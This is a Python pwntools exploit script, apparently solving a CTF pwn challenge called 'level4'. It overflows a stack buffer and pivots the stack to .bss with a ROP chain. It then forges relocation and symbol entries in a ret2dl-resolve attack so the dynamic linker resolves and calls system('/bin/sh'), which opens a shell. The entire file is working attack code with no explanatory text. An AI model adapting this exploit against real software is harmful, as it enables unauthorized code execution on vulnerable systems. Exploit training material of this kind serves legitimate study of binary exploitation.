#!/usr/bin/env python

from pwn import *

p = process('./level4')

offset = 0x8c
stack_size = 0x400
vulfun = 0x0804844b
bss_addr = 0x804a024
base_stage = bss_addr + stack_size

pppr = 0x8048509
p_ebp_r = 0x804850b
leave_r = 0x80483b8

elf = ELF('./level4')
write_plt = elf.plt['write']
read_plt = elf.plt['read']
write_got = elf.got['write']

def main():
    payload1 = 'A' * offset + p32(read_plt) + p32(pppr) + p32(0) + p32(base_stage)
    payload1 += p32(100) + p32(p_ebp_r) + p32(base_stage) + p32(leave_r)
    p.sendline(payload1)

    plt_start = 0x8048300
    rel_plt = 0x80482b0
    index_offset = (base_stage + 28) - rel_plt
    dynsym_addr = 0x80481cc
    dynstr_addr = 0x804822c
    fake_sym = base_stage + 36
    align = 0x10 - ((fake_sym - dynsym_addr) & 0xf)
    fake_sym = fake_sym +align
    index_dynsym = (fake_sym - dynsym_addr) / 0x10
    r_info = (index_dynsym << 8) | 0x7
    fake_reloc = p32(write_got) + p32(r_info)
    st_name = (fake_sym + 16) - dynstr_addr
    fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

    payload2 = 'B' * 4 + p32(plt_start) +p32(index_offset) + 'C'*4 + p32(base_stage+80)
    payload2 += 'A'*8 + fake_reloc + 'D'*align
    payload2 += fake_sym + 'system\x00'
    payload2 = payload2.ljust(80, 'A')
    payload2 += '/bin/sh\x00'
    payload2 = payload2.ljust(100, 'A')
    p.sendline(payload2)

    p.interactive()

if __name__ == '__main__':
    main()
